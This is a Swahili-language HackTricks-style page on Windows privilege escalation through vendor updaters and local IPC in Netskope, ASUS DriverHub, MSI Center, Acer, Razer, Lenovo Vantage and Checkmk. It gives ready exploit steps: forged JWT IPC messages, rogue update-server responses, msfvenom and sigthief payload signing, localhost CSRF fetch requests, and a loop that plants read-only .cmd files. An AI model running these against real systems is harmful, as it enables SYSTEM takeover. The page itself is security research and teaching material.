# Kutumia Vibaya Enterprise Auto-Updaters na Privileged IPC (kwa mfano, Netskope, ASUS na MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa jumla aina ya minyororo ya Windows local privilege escalation inayopatikana katika enterprise endpoint agents na updaters zinazotoa IPC surface isiyohitaji juhudi nyingi na update flow yenye privileges za juu. Mfano wake ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye privileges za chini anaweza kulazimisha enrollment iende kwenye server inayodhibitiwa na mshambuliaji, kisha kuwasilisha MSI hasidi ambayo huduma ya SYSTEM husakinisha.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya huduma yenye privileges za juu ili kulazimisha enrollment au reconfiguration iende kwenye server ya mshambuliaji.
- Tekeleza update endpoints za vendor, wasilisha Trusted Root CA potovu, kisha elekeza updater kwenye package hasidi “iliyotiwa saini”.
- Kwepa ukaguzi dhaifu wa signer (orodha zinazoruhusu CN), digest flags za hiari, na MSI properties zisizo na masharti makali.
- Ikiwa IPC “imesimbwa”, pata key/IV kutoka kwenye machine identifiers zinazosomeka na kila mtu na kuhifadhiwa kwenye registry.
- Ikiwa huduma inazuia callers kwa image path/process name, ingiza msimbo kwenye process iliyoruhusiwa au anzisha process ikiwa imesimamishwa, kisha weka DLL yako kwa kutumia marekebisho madogo ya thread-context.

Huduma maalum za TCP za ndani zinahitaji ukaguzi uleule wa utambulisho na mipaka ya ingizo, hata zinapohitaji PIN au application credential nyingine. Tambua process inayotumia listener na akaunti halisi ya huduma, kisha kagua binary/version iliyosakinishwa na kama sehemu zinazodhibitiwa na caller hukaguliwa urefu wake kabla ya kunakiliwa kwenye fixed buffers au kutumika kuunda child-process command. [Mwongozo wa Microsoft kuhusu buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) unaeleza kwa nini ingizo la nje lisilokaguliwa ni hatari katika privileged native code. Loopback listener, hardcoded credential, au process name pekee havithibitishi kuwepo kwa memory corruption au utekelezaji wa SYSTEM; reachability, authorization, code path na mitigations ni masharti tofauti. Fanya uchunguzi wa kawaida kwa njia isiyobadilisha hali ya mfumo, badala ya kutuma ingizo refu kiasi cha kusababisha crash kwenye huduma inayotumika.

---
## 1) Kulazimisha enrollment iende kwenye server ya mshambuliaji kupitia localhost IPC

Agents nyingi huja na user-mode UI process inayowasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Kilichoonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tengeneza JWT enrollment token ambayo claims zake hudhibiti backend host (kwa mfano, AddonUrl). Tumia alg=None ili kusiwe na haja ya signature.
2) Tuma ujumbe wa IPC unaoita provisioning command pamoja na JWT na tenant name:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Huduma inaanza kutuma maombi kwa seva yako ya rogue kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa uthibitishaji wa caller unategemea path/name, anzisha ombi kutoka kwa binary ya vendor iliyo kwenye allow-list (angalia §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Kuteka nyara update channel ili kuendesha code kama SYSTEM

Mara tu client inapowasiliana na seva yako, tekeleza endpoints zinazotarajiwa na uelekeze client kwenye MSI ya attacker. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha config ya JSON yenye muda mfupi sana wa updater interval, kwa mfano:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Hคืนisha cheti cha CA cha PEM. Huduma hukisakinisha kwenye hifadhi ya Local Machine Trusted Root.
3) /v2/checkupdate → Toa metadata inayoelekeza kwenye MSI hasidi na toleo bandia.

Kukwepa ukaguzi wa kawaida unaoonekana mara nyingi:
- Orodha ya kuruhusu ya Signer CN: huduma inaweza kuangalia tu kama Subject CN ni “netSkope Inc” au “Netskope, Inc.”. CA yako hasidi inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- Sifa ya CERT_DIGEST: jumuisha sifa ya MSI isiyo na madhara inayoitwa CERT_DIGEST. Hakuna uthibitishaji wakati wa usakinishaji.
- Uthibitishaji wa hiari wa digest: bendera ya usanidi (k.m., check_msi_digest=false) huzima uthibitishaji wa ziada wa kriptografia.

Matokeo: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na kutekeleza msimbo wowote kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Funzo la kukwepa kiraka: ikiwa muuzaji atajibu kwa kuruhusu tu seti ndogo ya vikoa “vinavyoaminika” badala ya kuthibitisha chanzo cha sasisho kwa njia ya kriptografia, tafuta redirector au reverse proxy zinazomilikiwa na muuzaji ambazo bado zinakuwezesha kuelekeza trafiki. Katika hali ya Netskope, utafiti wa umma uliofuata ulionyesha kwamba orodha ya kuruhusu ya enzi ya R129 bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo iliproxy maudhui ya Azure App Service yaliyodhibitiwa na mshambulizi. Chukulia orodha za majina ya wapangishi kama kikwazo kidogo tu, si kama mpaka wa uaminifu.<sup>[[14]](#references)</sup>

---
## 3) Kutengeneza maombi ya IPC yaliyosimbwa kwa njia fiche (yanapokuwepo)

Kuanzia R127, Netskope ilifunga JSON ya IPC ndani ya sehemu ya encryptData inayoonekana kama Base64. Uchunguzi wa ndani ulionyesha AES yenye key/IV zilizotokana na thamani za registry zinazosomeka na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kurudia usimbaji na kutuma amri halali zilizofichwa kwa usimbaji kutoka kwa mtumiaji wa kawaida.<sup>[[1]](#references)[[2]](#references)</sup> Dokezo la jumla: ikiwa agent itaanza ghafla “kusimba” IPC yake, tafuta device ID, product GUID na install ID zilizo chini ya HKLM zinazotumiwa kama nyenzo.

---
## 4) Kukwepa orodha za kuruhusu wapigaji wa IPC (ukaguzi wa njia/jina)

Baadhi ya huduma hujaribu kuthibitisha upande wa pili kwa kupata PID ya muunganisho wa TCP na kulinganisha njia/jina la image na binary za muuzaji zilizo kwenye orodha ya kuruhusu chini ya Program Files (k.m., stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- Kuingiza DLL kwenye mchakato ulio kwenye orodha ya kuruhusu (k.m., nsdiag.exe) na kupeleka IPC kupitia proxy kutoka ndani yake.
- Anzisha binary iliyo kwenye orodha ya kuruhusu ikiwa imesimamishwa na uanzishe proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza masharti ya ulinzi wa driver dhidi ya uharibifu.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Uingizaji unaoendana na ulinzi dhidi ya uharibifu: mchakato uliosimamishwa + kiraka cha NtContinue

Bidhaa mara nyingi hujumuisha driver ya minifilter/OB callbacks (k.m., Stadrv) ili kuondoa ruhusa hatari kwenye handles za michakato iliyolindwa:
- Mchakato: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huzuia ruhusa hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user-mode inayotegemewa na inayozingatia vikwazo hivi:
1) Tumia CreateProcess kuanzisha binary ya muuzaji kwa CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa kutumia: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye mchakato, na handle ya thread yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unatia kiraka kwenye msimbo wa RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema ambayo imehakikishwa kuwa imepakiwa kwenye memory) kwa stub fupi inayopiga LoadLibraryW na njia ya DLL yako, kisha kuruka kurudi.
4) Tumia ResumeThread kuendesha stub yako ndani ya mchakato na kupakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye mchakato ambao tayari umelindwa (uliuunda mwenyewe), sera ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Zana za vitendo
- NachoVPN (plugin ya Netskope) huendesha kiotomatiki uundaji wa CA hasidi, usainishaji wa MSI hasidi, na kutoa endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni mteja maalum wa IPC anayetengeneza ujumbe wowote wa IPC (unaoweza, kwa hiari, kusimbwa kwa AES) na hujumuisha uingizaji wa mchakato uliosimamishwa ili kuanzisha mawasiliano kutoka kwa binary iliyo kwenye orodha ya kuruhusu.<sup>[[4]](#references)</sup>

## 7) Mchakato wa haraka wa kuchunguza nyuso zisizojulikana za updater/IPC

Unapokutana na agent mpya ya endpoint au kifurushi cha “helper” cha motherboard, mchakato wa haraka kwa kawaida unatosha kubaini kama unachunguza lengo linalofaa la privesc:<sup>[[6]](#references)</sup>

1) Orodhesha wasikilizaji wa loopback na ulinganishe na michakato ya vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Orodhesha named pipes zinazowezekana:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Chunguza data ya routing inayotegemea registry inayotumiwa na seva za IPC zinazotegemea plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Kwanza, toa majina ya endpoint, funguo za JSON, na command IDs kutoka kwa client ya user-mode. Frontend za Electron/.NET zilizopakiwa mara nyingi hu-leak schema nzima:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tafuta trust predicate halisi, si code path tu ambayo hatimaye huzindua process:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Mifumo inayostahili kupewa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa cheti bila `WinVerifyTrust` kwa kawaida humaanisha kuwa “cheti kipo” kulichukuliwa kuwa “cheti kinaaminika”, jambo linalowezesha kuunda nakala za vyeti au mbinu nyingine za kutumia saini ghushi.
- Ukaguzi wa sehemu ndogo ya maandishi/mwisho wa maandishi kwenye `Origin`, `Referer`, URL za upakuaji, majina ya michakato, au CN za watia saini si uthibitishaji. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya kupitia vikoa vinavyofanana vinavyodhibitiwa na mshambuliaji.
- Ikiwa GUI yenye mapendeleo ya chini ndiyo huamua “faili linaaminika” na SYSTEM broker hutumia tu matokeo hayo, kubadilisha au kutekeleza upya DLL/JS ya upande wa mteja mara nyingi hupita kabisa mpaka huo (mgawanyo wa uthibitishaji wa mtindo wa Razer).
- Ikiwa broker inanukuu payload hadi `%TEMP%`/`C:\Windows\Temp` kisha kuithibitisha au kuipangia kazi kutoka kwenye njia hiyo, jaribu mara moja uwezekano wa kubadilisha faili kati ya ukaguzi na matumizi (TOCTOU), na moduli za plugin jirani zinazotoa wrappers mbadala za `ExecuteTask()` zenye ukaguzi dhaifu zaidi.<sup>[[6]](#references)</sup>

Kwa malengo yanayotumia sana named pipe, PipeViewer ni njia ya haraka ya kugundua DACL dhaifu na pipe zinazoweza kufikiwa kwa mbali kabla hujaanza kureverse protocol kwa kina.<sup>[[11]](#references)</sup>

Ikiwa lengo linathibitisha wapigaji kwa PID, njia ya image, au jina la mchakato pekee, ichukulie hiyo kama kikwazo kidogo badala ya mpaka wa usalama: kuingiza msimbo kwenye mteja halali, au kuanzisha muunganisho kutoka kwa mchakato ulio kwenye orodha ya ruhusa, mara nyingi hutosha kutimiza ukaguzi wa seva. Kwa named pipe hasa, [ukurasa huu kuhusu uigaji wa mteja na matumizi mabaya ya pipe](named-pipe-client-impersonation.md) unaeleza primitive hii kwa kina zaidi.

Kwa **broker ya upendeleo wa juu ya usafishaji au urejeshaji**, kagua pia mpaka wa uaminifu wa njia pamoja na ACL ya pipe. Mpigaji mwenye mapendeleo ya chini anaweza kuchagua mahali pa kurejeshea data au kubadilisha jina la nakala ya chelezo iliyoandaliwa katika saraka inayoshirikiwa, hata kama executable ya huduma na saraka yake ya usakinishaji vimelindwa. Thibitisha kando kwamba mpigaji anaweza kufikia amri ya urejeshaji, anaweza kurekebisha ingizo au jina mahususi la faili lililoandaliwa, broker inaendeshwa chini ya utambulisho wenye mapendeleo ya juu, na operesheni yake ya urejeshaji huandika kweli kwenye njia iliyolindwa iliyochaguliwa. Saraka ya maandalizi inayoweza kuandikwa au pipe inayoweza kusomwa pekee haithibitishi uwezekano wa kuandika kiholela kwa upendeleo wa juu; ulinganifu wa lengwa na tabia ya huduma vinahitaji ukaguzi wa msimbo au majaribio yanayodhibitiwa. Usitumie amri ya usafishaji usiyoijua wakati wa uchunguzi usioingilia mfumo, kwa sababu inaweza kufuta faili za mtumiaji.

---
## 8) Brokers za add-in za moduli zinazothibitishwa kwa saini za vendor pekee (muundo wa Lenovo Vantage)

Tofauti mpya zaidi inayostahili kutafutwa ni **signed-client RPC broker**: mchakato wa desktop wa Lenovo wenye saini na mapendeleo ya chini huzungumza na huduma ya SYSTEM, na huduma hiyo huelekeza amri za JSON kwenye seti ya add-in zinazoelezwa kwa XML chini ya `%ProgramData%`. Mara tu utekelezaji wa msimbo unapopatikana **ndani ya mteja yeyote mwenye saini inayokubaliwa**, kila mkataba wa `runas="system"` huwa sehemu ya eneo lako la mashambulizi.<sup>[[15]](#references)</sup>

Primitive zenye thamani kubwa zilizoonekana katika utafiti wa Lenovo Vantage:
- **Kumwamini mpigaji kwa sababu amesainiwa na vendor**: watafiti walifikia muktadha uliothibitishwa kwa kunakili EXE iliyosainiwa na Lenovo hadi saraka inayoweza kuandikwa na kutimiza DLL side-load (`profapi.dll`) ili msimbo holela uendeshwe ndani ya mteja ambaye huduma ilikuwa tayari inamwamini.
- **Ugunduzi wa eneo la mashambulizi unaoongozwa na manifest**: add-in hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; mikataba kadhaa huendeshwa kama `SYSTEM`, kwa hiyo kuorodhesha manifest hizo mara nyingi hufichua verb halisi zenye upendeleo kwa haraka zaidi kuliko kureverse broker yenyewe.
- **Hitilafu za kila amri nyuma ya channel iliyothibitishwa**: baada ya kuingia ndani ya mteja anayeaminika, utafiti wa umma uligundua path-traversal + race conditions kwenye verb za kusasisha/kusakinisha, matumizi mabaya ya raw SQL kwenye hifadhidata za mipangilio zenye upendeleo, na ukaguzi wa njia za registry unaotegemea sehemu ndogo za maandishi uliowezesha kuandika nje ya hive iliyokusudiwa.

Uchunguzi wa awali unaofaa kwenye lengo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Hitimisho la vitendo: kila suite ya helper inapofichua broker inayothibitisha kwanza **caller process** na kisha tu kuelekeza kwenye amri nyingi za plugin/add-in, usiishie baada ya kubypass ukaguzi wa uaminifu wa mwanzo. Dump jedwali la manifest/contract na fuzz kila verb yenye privilege ya juu kivyake; kwa kawaida channel iliyothibitishwa huficha bugs kadhaa za hatua ya pili.

---
## 1) CSRF ya browser-to-localhost dhidi ya privileged HTTP APIs (ASUS DriverHub)

DriverHub husambaza huduma ya HTTP ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia maombi ya browser yanayotoka https://driverhub.asus.com. Kichujio cha origin hufanya tu `string_contains(".asus.com")` kwenye header ya Origin na kwenye download URLs zinazofichuliwa na `/asus/v1.0/*`. Kwa hiyo, host yoyote inayodhibitiwa na mshambuliaji, kama vile `https://driverhub.asus.com.attacker.tld`, hupita ukaguzi na inaweza kutuma maombi yanayobadilisha hali kupitia JavaScript.<sup>[[6]](#references)</sup> Tazama [misingi ya CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo mingine ya kubypass.

Mtiririko wa vitendo:
1) Sajili domain inayojumuisha `.asus.com` na uhost ukurasa hasidi wa wavuti hapo.
2) Tumia `fetch` au XHR kupiga endpoint yenye privilege (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – JS iliyopakiwa ya frontend inaonyesha schema hapa chini.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Hata PowerShell CLI iliyoonyeshwa hapa chini hufanikiwa wakati header ya Origin inapo-spoofiwa kuwa thamani inayoaminika:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Ziara yoyote ya kivinjari kwenye tovuti ya mshambuliaji kwa hiyo huwa CSRF ya ndani inayohitaji kubofya mara 1 (au mara 0 kupitia `onload`), ambayo huendesha helper ya SYSTEM.

---
## 2) Uthibitishaji usio salama wa sahihi ya msimbo na kunakili cheti (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executable zozote zilizobainishwa kwenye JSON body na kuziweka akiba katika `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa URL ya upakuaji hutumia tena mantiki ileile ya substring, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya kupakua, ADU.exe hukagua tu kwamba PE ina sahihi na kwamba string ya Subject inalingana na ASUS kabla ya kuiendesha — hakuna `WinVerifyTrust`, wala uthibitishaji wa chain.

Ili kutumia vibaya mtiririko huu:
1) Unda payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Nakili signer wa ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Weka `pwn.exe` kwenye domain bandia inayofanana na `.asus.com` na uanzishe UpdateApp kupitia CSRF ya kivinjari iliyoelezwa hapo juu.

Kwa sababu vichujio vya Origin na URL vinategemea substring, na ukaguzi wa signer hulinganisha strings pekee, DriverHub hupakua na kuendesha binary ya mshambuliaji chini ya muktadha wake wenye ruhusa za juu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU ndani ya njia za kunakili/kuendesha za updater (MSI Center CMD_AutoUpdateSDK)

Huduma ya SYSTEM ya MSI Center hutoa protocol ya TCP ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component kuu (Component ID `0f 27 00 00`) inajumuisha `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa hadi `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha sahihi kupitia `CS_CommonAPI.EX_CA::Verify` (subject ya cheti lazima ilingane na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task inayoendesha faili la temp kama SYSTEM kwa kutumia arguments zinazodhibitiwa na mshambuliaji.

Faili lililonakiliwa halifungwi kati ya uthibitishaji na `ExecuteTask()`. Mshambuliaji anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyosainiwa na MSI (inahakikisha ukaguzi wa sahihi unafaulu na task inawekwa kwenye foleni).
- Kuitumia pamoja na jumbe za Frame B zinazorudiwa, zinazoelekeza kwenye payload hasidi na kubadilisha `MSI Center SDK.exe` mara tu baada ya uthibitishaji kukamilika.

Scheduler inapotekeleza task, huendesha payload iliyobadilishwa chini ya SYSTEM, licha ya kuwa ilithibitisha faili asili. Unyonyaji wa kuaminika hutumia goroutines/threads mbili zinazotuma maombi ya CMD_AutoUpdateSDK mfululizo hadi kushinda dirisha la TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya IPC maalum ya kiwango cha SYSTEM na impersonation (MSI Center + Acer Control Centre)

### Seti za amri za MSI Center TCP
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID inayohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, hivyo kuwapa washambuliaji uwezo wa kuelekeza amri kwa modules zozote.
- Plugins zinaweza kufafanua task runners zao wenyewe. `Support\API_Support.dll` hutoa `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na huita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila **uthibitishaji wa sahihi** — mtumiaji yeyote wa ndani anaweza kuielekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kunusa loopback kwa Wireshark au kuchunguza binaries za .NET katika dnSpy hufichua haraka uhusiano wa Component ↔ command; kisha wateja maalum wa Go/Python wanaweza kutuma tena frames.<sup>[[6]](#references)</sup>

### Named pipes za Acer Control Centre na viwango vya impersonation
- `ACCSvc.exe` (SYSTEM) hutoa `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake huruhusu wateja wa mbali (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na njia ya faili huita utaratibu wa huduma wa kuanzisha process.
- Client library husimba baiti ya mwisho maalum (113) pamoja na args. Instrumentation ya moja kwa moja kwa Frida/`TsDotNetLib` (tazama [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) huonyesha kwamba native handler huweka thamani hii kwenye `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na kuweka 114 (`0x72`) hupeleka utekelezaji kwenye tawi la jumla linalohifadhi token kamili ya SYSTEM na kuweka SID ya high-integrity (`S-1-16-12288`). Kwa hiyo binary iliyoanzishwa huendeshwa kama SYSTEM isiyo na vizuizi, ndani ya mashine na kati ya mashine.
- Changanya hili na flag ya installer iliyo wazi (`Setup.exe -nocheck`) ili kusakinisha ACC hata kwenye lab VMs na kujaribu pipe bila hardware ya vendor.<sup>[[6]](#references)</sup>

Hitilafu hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zitekeleze mutual authentication (ALPC SIDs, vichujio vya `ImpersonationLevel=Impersonation`, uchujaji wa token) na kwa nini helper ya kila module ya “kuendesha binary yoyote” lazima itumie uthibitishaji uleule wa signer.

---
## 3) COM/IPC “elevator” helpers zinazotegemea uthibitishaji dhaifu wa user-mode (Razer Synapse 4)

Razer Synapse 4 iliongeza mbinu nyingine muhimu katika kundi hili: mtumiaji mwenye ruhusa ndogo anaweza kuiomba COM helper ianzishe process kupitia `RzUtility.Elevator`, huku uamuzi wa uaminifu ukikabidhiwa kwa DLL ya user-mode (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya mpaka wenye ruhusa za juu.

Njia ya unyonyaji iliyozingatiwa:
- Unda COM object `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` ili kuomba uzinduzi wenye ruhusa za juu.
- Katika public PoC, ukaguzi wa sahihi ya PE ndani ya `simple_service.dll` huzimwa kwa patch kabla ya kutuma ombi, na hivyo kuruhusu executable yoyote iliyochaguliwa na mshambuliaji kuzinduliwa.<sup>[[6]](#references)[[10]](#references)</sup>

Utekelezaji mdogo wa PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Hitimisho la jumla: unapofanya reverse engineering ya suite za “helper”, usiishie kwenye localhost TCP au named pipes. Angalia kama kuna madarasa ya COM yenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha kama huduma yenye haki za juu inathibitisha binary lengwa yenyewe au inaamini tu matokeo yaliyokokotolewa na client DLL ya user-mode inayoweza kubadilishwa. Muundo huu hauishii kwa Razer: muundo wowote uliogawanywa ambapo broker yenye haki za juu hutumia uamuzi wa allow/deny kutoka upande wenye haki za chini unaweza kuwa eneo la privesc.

---
## Utekelezaji wa script ya muda inayotabirika wakati wa MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vyenye haki za juu kwa kuandika `.cmd` ya muda kwenye `C:\Windows\Temp` na kuitekeleza kama `SYSTEM`. Ikiwa jina la faili linatabirika na huduma haiundi upya faili zilizopo kwa usalama, mtumiaji mwenye haki za chini anaweza kuunda mapema faili ya muda inayotarajiwa na kuiweka **read-only**, na hivyo kufanya mchakato wenye haki za juu utekeleze maudhui yanayodhibitiwa na mshambuliaji badala ya script yake yenyewe.

Ilibainika katika matoleo hatarishi ya Checkmk Agent:
- muundo wa temp: `cmk_all_<PID>_1.cmd`
- matawi yaliyoathiriwa: `2.0.0`, `2.1.0`, `2.2.0`
- kichocheo: **repair** ya MSI ya kifurushi cha agent kilichohifadhiwa kwenye cache<sup>[[8]](#references)[[9]](#references)</sup>

Mtiririko wa kazi wa vitendo:
1. Kadiria masafa halisi ya PID kwa kutumia process IDs za sasa au PID ya agent inayoendeshwa.
2. Andika payload fupi ya `.cmd` ya **ASCII** (`Set-Content -Encoding Ascii` au uelekezaji wa `cmd.exe`; epuka matokeo ya PowerShell ya UTF-16 kwa batch files).
3. Sambaza `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika masafa lengwa na uweke kila faili kuwa read-only.
4. Anzisha repair ya MSI iliyohifadhiwa kwenye cache ili huduma yenye haki za juu ijaribu kuunda upya, kisha kutekeleza script ya temp.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ikiwa bidhaa iliyo hatarini imesakinishwa kwa kutumia Windows Installer, tambua jina la bidhaa linalohusiana na MSI iliyowekwa akiba yenye jina linaloonekana la nasibu chini ya `C:\Windows\Installer` kabla ya kuanzisha ukarabati:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Maelezo ya kiutendaji:
- `qwinsta` ni muhimu pale `msiexec /fa` inaposhindwa kutoka kwenye WinRM shell isiyoingiliana na unahitaji kujua ikiwa session ya desktop iliyopo/iliyokatika inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
- Muundo huu unatumika pia kwa endpoint agents na updaters wengine wanaoweka scripts za muda kwenye maeneo yanayoweza kuandikiwa na kila mtu, kisha kuzitekeleza kama SYSTEM. Jaribu majina yanayotabirika, kukosekana kwa semantiki ya exclusive create, na mtiririko wa repair/update unaoweza kuanzishwa unapohitajika.

### Kurekebisha installer kwa njia ya mwingiliano na console yenye haki za juu

